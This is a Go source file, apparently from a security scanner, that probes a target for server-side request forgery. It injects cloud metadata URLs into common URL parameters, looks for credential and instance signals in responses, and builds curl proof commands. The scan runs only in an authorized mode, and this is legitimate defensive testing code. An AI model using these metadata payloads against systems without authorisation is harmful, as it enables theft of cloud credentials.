// Package ssrf probes for Server-Side Request Forgery by injecting cloud
// metadata URLs into common redirect/URL parameters and checking whether
// the server fetches and reflects the metadata response.
//
// Active exploitation probes require ScanAuthorized mode (--authorized flag).
// ScanAuthorized only (active payloads that cause outbound HTTP requests).
package ssrf

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
)

const (
	scannerName = "ssrf"
	maxBodySize = 64 * 1024 // 64 KB
)

// probeParams are query parameter names commonly used to pass URLs or redirect
// targets. These are the most likely vectors for SSRF in web applications.
var probeParams = []string{
	"url", "redirect", "webhook", "image", "fetch",
	"endpoint", "uri", "path", "proxy", "target",
	"link", "src", "href", "goto",
}

// metadataPayloads are cloud instance metadata endpoints. A successful SSRF
// will cause the target server to fetch these URLs and return their content.
var metadataPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://metadata.google.internal/computeMetadata/v1/",
	// Azure IMDS — requires Metadata: true header. We probe without it first
	// (proxies often strip custom headers) and with it in the dedicated Azure check.
	"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
	// DigitalOcean metadata
	"http://169.254.169.254/metadata/v1.json",
	// Alibaba Cloud ECS metadata
	"http://100.100.100.200/latest/meta-data/",
	// Oracle Cloud Infrastructure metadata
	"http://169.254.169.254/opc/v1/instance/",
}

// metadataSignals are substrings that appear in cloud metadata CONTENT.
// These must NOT be substrings of any payload URL — otherwise a server that
// reflects the URL back in a redirect body produces a false positive.
// "computeMetadata" was removed because it is part of the GCP payload URL.
var metadataSignals = []string{
	"ami-id",           // AWS IMDS: appears in actual metadata listing
	"AccessKeyId",      // AWS IMDS: IAM credential key
	"instance-id",      // AWS IMDS / DigitalOcean / Oracle Cloud
	"local-hostname",   // AWS IMDS
	"security-groups",  // AWS IMDS
	"serviceAccounts",  // GCP metadata API JSON response key
	"instance/id",      // GCP metadata path returned as content
	"project-id",       // GCP metadata content
	"subscriptionId",   // Azure IMDS JSON response field
	"vmId",             // Azure IMDS JSON response field
	"droplet_id",       // DigitalOcean metadata response field
}

// Scanner probes for SSRF vulnerabilities via cloud metadata injection.
type Scanner struct{}

// New returns a new Scanner.
func New() *Scanner { return &Scanner{} }

// Name returns the stable scanner identifier.
func (s *Scanner) Name() string { return scannerName }

// Run executes the SSRF scan. Only runs in deep mode.
func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	// Exploitation probes require --authorized (beyond --deep).
	if scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		// Do not follow redirects — we want to inspect the direct response.
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	scheme := detectScheme(ctx, client, asset)
	base := scheme + "://" + asset

	var findings []finding.Finding

	for _, param := range probeParams {
		for _, payload := range metadataPayloads {
			u := base + "/?" + param + "=" + url.QueryEscape(payload)
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
			resp.Body.Close()

			// A redirect is NOT SSRF — it's an open redirect at best. SSRF requires
			// the server to fetch the URL itself and return the fetched content.
			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				continue
			}

			bodyStr := string(body)
			signal := metadataSignalFound(bodyStr)
			if signal == "" {
				continue
			}

			findings = append(findings, finding.Finding{
				CheckID:  finding.CheckWebSSRF,
				Module:   "deep",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Title:    fmt.Sprintf("SSRF via parameter %q reflects cloud metadata on %s", param, asset),
				Description: fmt.Sprintf(
					"The parameter %q on %s accepted a cloud metadata URL (%s) and the "+
						"response body contained %q, indicating the server fetched the "+
						"metadata endpoint and returned its content. An attacker can use "+
						"this to read IAM credentials and instance metadata from the cloud provider.",
					param, asset, payload, signal),
				Asset:    asset,
				DeepOnly: true,
				ProofCommand: fmt.Sprintf(
					// --max-redirs 0 mirrors the scanner: we want the direct response,
					// not a redirect chain. A 3xx is open redirect, not SSRF.
					`curl -s --max-redirs 0 "%s/?%s=%s" | grep -E "ami-id|AccessKeyId|instance-id|local-hostname|security-groups|serviceAccounts|project-id"`,
					base, param, url.QueryEscape(payload)),
				Evidence: map[string]any{
					"url":     u,
					"param":   param,
					"payload": payload,
					"signal":  signal,
				},
				DiscoveredAt: time.Now(),
			})

			// One finding per param is sufficient; move to the next param.
			break
		}
	}

	// ── OOB redirect-to-metadata detection ─────────────────────────────────
	// When a server redirects to the user-supplied URL instead of fetching it
	// server-side, the Location header will contain a metadata IP. While this
	// is technically an open redirect, redirecting to cloud metadata IPs is a
	// well-known SSRF escalation pattern (e.g. IMDS via 302 redirect on ELB).
	for _, param := range probeParams {
		for _, payload := range metadataPayloads {
			u := base + "/?" + param + "=" + url.QueryEscape(payload)
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			io.Copy(io.Discard, io.LimitReader(resp.Body, 1024)) //nolint:errcheck
			resp.Body.Close()

			if resp.StatusCode < 300 || resp.StatusCode >= 400 {
				continue
			}

			location := resp.Header.Get("Location")
			if location == "" {
				continue
			}

			if !isMetadataRedirect(location) {
				continue
			}

			findings = append(findings, finding.Finding{
				CheckID:  finding.CheckWebSSRFRedirectMetadata,
				Module:   "deep",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Title:    fmt.Sprintf("SSRF via redirect: parameter %q redirects to cloud metadata on %s", param, asset),
				Description: fmt.Sprintf(
					"The parameter %q on %s caused a redirect (HTTP %d) to a cloud metadata "+
						"endpoint (%s). When this application runs behind a load balancer or reverse proxy "+
						"that follows redirects, the metadata service is reachable. An attacker can use "+
						"this to steal IAM credentials and instance metadata.",
					param, asset, resp.StatusCode, location),
				Asset:    asset,
				DeepOnly: true,
				ProofCommand: fmt.Sprintf(
					`curl -si "%s/?%s=%s" | grep -i Location`,
					base, param, url.QueryEscape(payload)),
				Evidence: map[string]any{
					"url":              u,
					"param":            param,
					"payload":          payload,
					"redirect_location": location,
					"status_code":      resp.StatusCode,
				},
				DiscoveredAt: time.Now(),
			})
			// One finding per param is sufficient.
			break
		}
	}

	// Azure IMDS requires a Metadata: true header. Proxying servers may strip
	// non-standard headers, so the main loop above tests without it. Here we
	// probe explicitly with the header to catch servers that do forward it.
	azurePayload := "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
	for _, param := range probeParams {
		u := base + "/?" + param + "=" + url.QueryEscape(azurePayload)
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
		req.Header.Set("Metadata", "true")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
		resp.Body.Close()

		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			continue
		}

		bodyStr := string(body)
		signal := metadataSignalFound(bodyStr)
		if signal == "" {
			continue
		}

		findings = append(findings, finding.Finding{
			CheckID:  finding.CheckWebSSRF,
			Module:   "deep",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    fmt.Sprintf("SSRF via parameter %q reflects Azure metadata on %s", param, asset),
			Description: fmt.Sprintf(
				"The parameter %q on %s accepted an Azure IMDS URL (%s) with the required "+
					"Metadata: true header, and the response body contained %q. An attacker can use "+
					"this to read Azure subscription details, VM identity, and managed identity credentials.",
				param, asset, azurePayload, signal),
			Asset:    asset,
			DeepOnly: true,
			ProofCommand: fmt.Sprintf(
				`curl -s --max-redirs 0 -H 'Metadata: true' "%s/?%s=%s" | grep -E "subscriptionId|vmId|instance-id"`,
				base, param, url.QueryEscape(azurePayload)),
			Evidence: map[string]any{
				"url":     u,
				"param":   param,
				"payload": azurePayload,
				"signal":  signal,
			},
			DiscoveredAt: time.Now(),
		})
		break
	}

	return findings, nil
}

// metadataSignalFound returns the first metadata signal string found in body,
// or an empty string if none are present.
func metadataSignalFound(body string) string {
	for _, sig := range metadataSignals {
		if strings.Contains(body, sig) {
			return sig
		}
	}
	return ""
}

// metadataIPs are the IP addresses and hostnames associated with cloud
// metadata services. A redirect to any of these is a strong SSRF signal.
var metadataIPs = []string{
	"169.254.169.254",         // AWS, Azure, DigitalOcean, Oracle
	"metadata.google.internal", // GCP
	"100.100.100.200",         // Alibaba Cloud
}

// isMetadataRedirect returns true if the Location header points to a known
// cloud metadata endpoint IP or hostname.
func isMetadataRedirect(location string) bool {
	for _, ip := range metadataIPs {
		if strings.Contains(location, ip) {
			return true
		}
	}
	return false
}

// detectScheme tries HTTPS first, falling back to HTTP.
func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, "https://"+asset, nil)
	if err != nil {
		return "http"
	}
	resp, err := client.Do(req)
	if err != nil {
		return "http"
	}
	resp.Body.Close()
	return "https"
}
